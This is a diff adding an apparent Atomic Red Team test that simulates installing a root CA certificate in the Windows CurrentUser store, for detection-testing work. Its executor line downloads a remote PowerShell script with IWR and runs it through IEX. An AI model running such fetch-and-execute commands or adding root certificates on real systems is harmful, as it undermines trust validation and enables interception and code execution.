@@ -152,3 +152,18 @@ atomic_tests:
       } catch { }
     name: powershell
     elevation_required: true
+- name: Add Root Certificate to CurrentUser Certificate Store
+  auto_generated_guid: ca20a3f1-42b5-4e21-ad3f-1049199ec2e0
+  description: |
+    The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
+    Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
+    Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+    cleanup_command: |
+       Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
+    name: powershell
+    elevation_required: true
